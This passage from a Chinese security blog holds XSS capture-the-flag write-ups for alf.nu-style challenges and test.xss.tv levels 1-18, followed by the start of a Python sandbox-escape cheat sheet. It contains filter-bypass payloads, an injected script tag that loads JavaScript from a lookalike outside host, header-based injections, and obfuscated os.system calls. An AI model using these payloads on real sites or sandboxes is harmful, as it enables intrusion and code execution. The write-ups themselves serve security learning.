<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">"HTTPS://WWW.SEGMENTFAULT.COM.HAOZI.ME/J.JS"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>过滤了<code>&amp; &#39; &quot; &lt; &gt; /</code>，转换为了html实体编码，但是由于input code在img标签内，所以html实体编码是可以被直接解析的。<br>所以闭合前面的标签，在构造语句即可。</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">');alert('1</span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">"console.error('&amp;#39;);alert(&amp;#39;1')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">实际上就是</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">"console.error('');alert('1')"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>由于input实在script标签里面，且没有任何过滤，所以直接闭合前面的语句，构造下一条语句即可。</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">'';alert(1)</span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.data = <span class="string">''</span>;alert(<span class="number">1</span>)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>用反斜杠转移了一堆字符，但是<code>&quot;</code>被转义成<code>\&quot;</code>正好可以闭合<code>console.log(&quot;\&quot;)</code>，既然闭合了前面的语句那么之后就构造后面的语句就行了。</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">"),alert(1)//</span><br><span class="line">");alert("1</span><br><span class="line">"),alert(1)("</span><br><span class="line">这三个都可以..</span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">  <span class="keyword">var</span> url = <span class="string">'javascript:console.log("\"),alert(1)\/\/")'</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span></span><br><span class="line"><span class="undefined">  a.href = url</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.appendChild(a)</span></span><br><span class="line"><span class="undefined">  a.click()</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>匹配<code>&quot;</code>替换为<code>\&quot;</code>，这里直接用<code>\&quot;)</code>闭合前面的双引号会被转义，所以在加一个<code>\</code>来转义<code>\</code>即可。</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">\");alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"\\"</span>);alert(<span class="number">1</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>");<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这一套题主要是熟悉一下基本绕过方式，实战性不是很强，初学XSS还需继续努力。</p>
<p><br></p>
<p>那么就再刷一套题吧</p>
<h4 id="XSS挑战"><a href="#XSS挑战" class="headerlink" title="XSS挑战"></a>XSS挑战</h4><p>题目地址：<a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a></p>
<h5 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h5><p>输入的地方，在h2标签内，先闭合标签再构造。</p>
<p>payload：<br><code>&lt;/h2&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><br></p>
<h5 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h5><p><code>&lt;input name=&quot;keyword&quot; value=&quot;input code&quot;&gt;</code></p>
<p>输入点在<code>input标签内部</code>，所以先闭合<code>input</code>标签。</p>
<p>payload：<br><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><br></p>
<h5 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h5><p>这一关输入点，同样在<code>input</code>标签的<code>value</code>值内，尝试上一关闭合标签构造，但是没有成功。</p>
<p>双引号闭合<code>value=&quot;</code>失败，单引号闭合成功。<br>然后利用onclick、onmouseover等事件进行弹窗。<br>注释掉后面的代码。</p>
<p>payload:<br><code>&#39; onmouseover=alert(1)//</code></p>
<p><br></p>
<h5 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h5><p>与上一关类似，用双引号闭合<code>value=&quot;</code>即可。</p>
<p>payload:<br><code>&quot; onclick=alert(1)//</code><br><br></p>
<h5 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h5><p>这一关会将<code>script</code>替换成<code>scr_ipt</code>，<code>on</code>也会被替换成<code>o_n</code>。</p>
<p>我们可以闭合<code>&lt;input&gt;</code>后利用<code>&lt;a&gt;</code>标签进行弹窗：</p>
<p>payload:<br><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;Lethe&lt;/a&gt;//</code><br><br></p>
<h5 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h5><p>这一关在上一关的基础上，多过滤了<code>href</code>、<code>src</code>、<code>data</code>。</p>
<p>经测试，可以利用大小写进行绕过。</p>
<p>payload：<br><code>&quot;&gt;&lt;a hREf=&quot;javascript:alert(1)&quot;&gt;Lethe&lt;/a&gt;//</code><br><br></p>
<h5 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h5><p>先用之前的payload进行测试，发现<code>href</code>和<code>script</code>直接消失了，于是尝试双写绕过，成功。</p>
<p>payload:<br><code>&quot;&gt;&lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;Lethe&lt;/a&gt;//</code><br><br></p>
<h5 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h5><p>这一关和前面稍有不同，可以添加友情链接，添加过后的内容直接包含在<code>&lt;a href=&quot;input code&quot;&gt;友情链接&lt;/a&gt;</code>里面。</p>
<p>于是先尝试<code>javascritpt:alert(1)</code>，但是<code>script</code>同样被替换成了<code>scr_ipt</code>。</p>
<p>因为html标签内可以直接解析html实体编码，于是尝试用实体编码绕过。</p>
<p>payload:<br><code>java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</code><br><br></p>
<h5 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h5><p>和上题类似，但是这里对链接有了一定要求，必须包含<code>http://</code>，却没有要求一定要在开头….不知道有什么意义</p>
<p>所以直接在构造的语句最后加上<code>http://</code>绕过检测，再注释掉即可。</p>
<p>payload：<br><code>java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)//http://</code><br><br></p>
<h5 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h5><p>这题没有输入框，url上给了一个keyword参数，尝试闭合再构造，虽然回显的内容没有过滤，但是却不会弹窗，查看源码，发现还有一个隐藏的form表单，看看能否利用。</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730195539277.png" alt="在这里插入图片描述"></p>
<p>尝试<code>?t_link=Lethe&amp;t_history=Lethe&amp;t_sort=Lethe</code></p>
<p>发现<code>t_sort</code>参数可以利用</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730195830826.png" alt="在这里插入图片描述"></p>
<p>于是进行构造，发现尖括号被过滤了，于是利用事件进行弹窗。</p>
<p>payload:<br><code>?t_sort=&quot; type=image src=x onerror=alert(1)//</code></p>
<p><br></p>
<h5 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h5><p>和上一关一样有一个隐藏的表单，也是<code>t_sort</code>参数可以利用</p>
<p><img src="/2019/07/30/XSS刷题之旅/2019073020054445.png" alt="在这里插入图片描述"></p>
<p>用上一关的payload进行测试，发现双引号也被过滤了，应该又要换个思路了。</p>
<p>重新打开页面观察源码，看到一个可疑的地方，那新增的一个参数不是白加的，当你从第10关跳到第11关时，<code>t_ref</code>的value值是页面的Referer的值。</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730201235164.png" alt="在这里插入图片描述"></p>
<p>于是在跳转的时候抓包修改Referer的值为<code>&quot; type=text onclick=&quot;alert(1)</code>，如下：</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730201950407.png" alt="在这里插入图片描述"></p>
<p>然后在Target界面Forward，回到闯关页面发现已成功注，点击输入框即可弹窗。</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730202044406.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h5 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h5><p>与上一关类似，不过这里是利用User-Agent:</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730202249699.png" alt="在这里插入图片描述"></p>
<p>同样抓包修改User-Agent的值进行构造</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730202431311.png" alt="在这里插入图片描述"></p>
<p>payload:<br><code>&quot; type=text onclick=&quot;alert(1)</code></p>
<p><br></p>
<h5 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h5><p>与前两关相同，只不过这一关是利用Cookie进行注入。</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730202710641.png" alt="在这里插入图片描述"></p>
<p>抓包修改Cookie为：<code>user=&quot; type=text onclick=&quot;alert(1)</code>即可</p>
<p><img src="/2019/07/30/XSS刷题之旅/2019073020292078.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h5 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h5><p>进入14关，没有输入框，url中没有参数，查看源码，发现使用了<code>&lt;iframe&gt;</code>标签引入了<code>http://www.exifviewer.org/</code></p>
<p>但是我这边一直打不开<code>http://www.exifviewer.org/</code>，根据网上的题解，上传一个含有xss代码的图片触发xss，关于exif xss这一题的解法，可参考:<a href="https://xz.aliyun.com/t/1206" target="_blank" rel="noopener">https://xz.aliyun.com/t/1206</a></p>
<p><br></p>
<h5 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h5><p>页面什么都没有，那么直接看源码</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730204024883.png" alt="在这里插入图片描述"></p>
<p>第一眼看貌似也没什么，实际上还是因为我对js不是很熟悉…搜索得到，这里使用了AngularJS框架的 <code>ng-include</code> 指令，可参考：<a href="https://www.runoob.com/angularjs/ng-ng-include.html" target="_blank" rel="noopener">https://www.runoob.com/angularjs/ng-ng-include.html</a></p>
<p>其实就是可以利用 <code>ng-include</code> 指令来包含文件&gt;</p>
<p>有两默认情况下，包含的文件需要包含在同一个域名下，也就是符合SOP。</p>
<p>所以网上大多方法是包含了第一关的代码，如下payload：<code>?src=&#39;level1.php?name=test&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
<p>但是我在做的过程中发现，引用的名字会直接出现在源码上:</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730210141438.png" alt="在这里插入图片描述"></p>
<p>那么理论上通过闭合也是可以的</p>
<p>于是尝试payload:<br><code>?src=&quot;&gt;&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</code></p>
<p>发现真的是可以的..</p>
<p><img src="/2019/07/30/XSS刷题之旅/2019073021103933.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h5 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h5><p>输入点包含在<code>&lt;center&gt;</code>标签内，过滤了空格，可以用<code>%0a</code>代替空格进行绕过。</p>
<p>payload:<br><code>?keyword=&lt;img%0asrc=x%0aonerror=alert(1)&gt;</code><br><br></p>
<h5 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h5><p>进入之后会看到一个关于flash的什么东西，暂时先不管，做xss先找输入输出点。</p>
<p>url中有<code>arg01</code>和<code>arg02</code>两个参数，应该是输入点，查看源码发现在<code>&lt;embed&gt;</code>标签的<code>src</code>中会输出这两个参数的值，如下：</p>
<p><img src="/2019/07/30/XSS刷题之旅/20190730211932413.png" alt="在这里插入图片描述"></p>
<p>先试试闭合，发现过滤了尖括号，可以考虑用<code>onerror</code>弹窗。</p>
<p>payload：<br><code>?arg01=&amp;arg02= onmouseover=alert(1)</code></p>
<p><br></p>
<h5 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h5><p>这一关和17关好像是一样的…</p>
<p>payload:<br><code>?arg01=&amp;arg02= onmouseover=alert(1)</code></p>
<p><br></p>
<p> Level 19 20 好像是关于flash xss的，由于了解不多，而且现在网站用flash的也越来越少了，就不做了。</p>
<p><br></p>
<h3 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h3><p>做了这两套题，这只能说是刚刚了解了XSS是什么，还要很多很多知识需要学习，尤其是要加强实战方面的运用，这就只能在以后的学习过程中慢慢积累了。</p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>python沙盒逃逸</title>
    <url>/2019/08/13/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h3 id="0x01-简单介绍"><a href="#0x01-简单介绍" class="headerlink" title="0x01 简单介绍"></a>0x01 简单介绍</h3><p>python沙盒逃逸就是通过绕过种种过滤和限制，拿到本不应获取的一些“危险函数”，或者绕过Python终端达到命令执行的效果。</p>
<p><br></p>
<h3 id="0x02-常用备忘录"><a href="#0x02-常用备忘录" class="headerlink" title="0x02 常用备忘录"></a>0x02 常用备忘录</h3><h6 id="（1）func-globals"><a href="#（1）func-globals" class="headerlink" title="（1）func_globals"></a>（1）func_globals</h6><p>用法：function.func_globals</p>
<p>作用：返回包含函数全局变量的字典的引用——定义函数的模块的全局命名空间。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span><span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test.func_globals</span><br><span class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'test'</span>: &lt;function test at <span class="number">0x000000000392DAC8</span>&gt;, <span class="string">'__doc__'</span>: <span class="literal">None</span>, <span class="string">'__package__'</span>: <span class="literal">None</span>&#125;</span><br></pre></td></tr></table></figure>
<h6 id="（2）-getattribute"><a href="#（2）-getattribute" class="headerlink" title="（2）__getattribute__"></a>（2）__getattribute__</h6><p>用法：object.__getattribute__(self, name) </p>
<p>作用：无条件被调用，通过实例访问属性。如果class中定义了<strong>getattr</strong>()，则<strong>getattr</strong>()不会被调用（除非显示调用或引发AttributeError异常）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__import__(“os”).__getattribute__(“metsys”[::<span class="number">-1</span>])(‘ls’)</span><br><span class="line"></span><br><span class="line">__import__(“os”).__getattribute__(“flfgrz”.encode(“rot13”))(‘ls’)</span><br></pre></td></tr></table></figure>
<h6 id="（3）dir-与-dict"><a href="#（3）dir-与-dict" class="headerlink" title="（3）dir() 与 __dict__"></a>（3）dir() 与 __dict__</h6><p>这两种方法都是一个目的,那就是列出一个模组/类/对象 下面 所有的属性和函数。</p>
<p>这在沙盒逃逸中是很有用的,可以找到隐藏在其中的一些东西。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__dict__[<span class="string">'upper'</span>]  </span><br><span class="line">&lt;method <span class="string">'upper'</span> of <span class="string">'str'</span> objects&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(<span class="string">''</span>.__class__)</span><br><span class="line">[<span class="string">'__add__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__getnewargs__'</span>, <span class="string">'__getslice__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__mod__'</span>, <span class="string">'__mul__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__rmod__'</span>, <span class="string">'__rmul__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'_formatter_field_name_split'</span>, <span class="string">'_formatter_parser'</span>, <span class="string">'capitalize'</span>, <span class="string">'center'</span>, <span class="string">'count'</span>, <span class="string">'decode'</span>, <span class="string">'encode'</span>, <span class="string">'endswith'</span>, <span class="string">'expandtabs'</span>, <span class="string">'find'</span>, <span class="string">'format'</span>, <span class="string">'index'</span>, <span class="string">'isalnum'</span>, <span class="string">'isalpha'</span>, <span class="string">'isdigit'</span>, <span class="string">'islower'</span>, <span class="string">'isspace'</span>, <span class="string">'istitle'</span>, <span class="string">'isupper'</span>, <span class="string">'join'</span>, <span class="string">'ljust'</span>, <span class="string">'lower'</span>, <span class="string">'lstrip'</span>, <span class="string">'partition'</span>, <span class="string">'replace'</span>, <span class="string">'rfind'</span>, <span class="string">'rindex'</span>, <span class="string">'rjust'</span>, <span class="string">'rpartition'</span>, <span class="string">'rsplit'</span>, <span class="string">'rstrip'</span>, <span class="string">'split'</span>, <span class="string">'splitlines'</span>, <span class="string">'startswith'</span>, <span class="string">'strip'</span>, <span class="string">'swapcase'</span>, <span class="string">'title'</span>, <span class="string">'translate'</span>, <span class="string">'upper'</span>, <span class="string">'zfill'</span>]</span><br></pre></td></tr></table></figure>
<h6 id="（4）-base"><a href="#（4）-base" class="headerlink" title="（4）__base__"></a>（4）__base__</h6><ul>
<li><p>每个类都有一个<strong>base</strong>属性能列出其基类。</p>
</li>
<li><p>注意：__base__ 和 __bases__的区别<br>他们都是返回当前类的基类，只不过__bases__返回的是一个元祖</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">object</span>'&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ''.<span class="title">__class__</span>.<span class="title">__bases__</span></span></span><br><span class="line"><span class="class"><span class="params">(&lt;class <span class="string">'object'</span>&gt;,)</span></span></span><br></pre></td></tr></table></figure>
<h6 id="（5）-mro"><a href="#（5）-mro" class="headerlink" title="（5）__mro__"></a>（5）__mro__</h6><p>递归地显示父类一直到 object</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2.7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;type <span class="string">'str'</span>&gt;, &lt;type <span class="string">'basestring'</span>&gt;, &lt;type <span class="string">'object'</span>&gt;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3.7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br></pre></td></tr></table></figure>
<h6 id="（6）-subclasses"><a href="#（6）-subclasses" class="headerlink" title="（6）__subclasses__()[]"></a>（6）__subclasses__()[]</h6><p>获取当前类的子类，以元组形式返回。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2.7中</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;type <span class="string">'file'</span>&gt;</span><br></pre></td></tr></table></figure>
<h6 id="（7）-import"><a href="#（7）-import" class="headerlink" title="（7）__import__"></a>（7）__import__</h6><p>用于动态的导入模块，<code>__import__(module)</code>相当于<code>import module</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__import__ (name)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__import__(<span class="string">'os'</span>)</span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</span><br></pre></td></tr></table></figure>
<h6 id="（8）-bulitin"><a href="#（8）-bulitin" class="headerlink" title="（8）__bulitin__"></a>（8）__bulitin__</h6><p>Python的内建模块，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀<br>在Python2.X版本中，内建模块被命名为<strong>builtin</strong>，而到了Python3.X版本中，却更名为builtins。</p>
<h6 id="（9）-builtins"><a href="#（9）-builtins" class="headerlink" title="（9）____builtins__"></a>（9）____builtins__</h6><p>是对内建模块的一个引用<br>这个和<strong>builtin</strong>有一些区别</p>
<p>1）无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入<strong>builtin</strong>内建模块;而对于<strong>builtins</strong>却不用导入，它在任何模块都直接可见，可以把它当作内建模块直接使用</p>
<p>2）<strong>builtins</strong>虽是对内建模块的引用，但这个引用要看是使用<strong>builtins</strong>的模块是哪个模块</p>
<p>① 在主模块<strong>main</strong>中：<br>__builtins__是对内建模块<strong>builtin</strong>本身的引用，即<strong>builtins</strong>完全等价于<strong>builtin</strong>，二者完全是一个东西，不分彼此</p>
<p>② 在<strong>main</strong>模块中：<br>__builtins__仅是对<strong>builtin</strong>.<strong>dict</strong>的引用，而非<strong>builtin</strong>本身。它在任何地方都可见。此时<strong>builtins</strong>的类型是字典。</p>
<h6 id="（10）reload"><a href="#（10）reload" class="headerlink" title="（10）reload"></a>（10）reload</h6><p>重新加载之前导入的模块。</p>
<p>reload (module)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(sys)</span><br><span class="line">&lt;module <span class="string">'sys'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
<h6 id="（11）getattr"><a href="#（11）getattr" class="headerlink" title="（11）getattr"></a>（11）getattr</h6><p>作用：返回对象的命名属性的值。</p>
<p>用法：getattr (object, name)</p>
<ul>
<li>相当于<code>object.name</code></li>
<li>name 必须是一个字符串</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>    bar =<span class="number">1</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = A()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(a,<span class="string">'bar'</span>)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
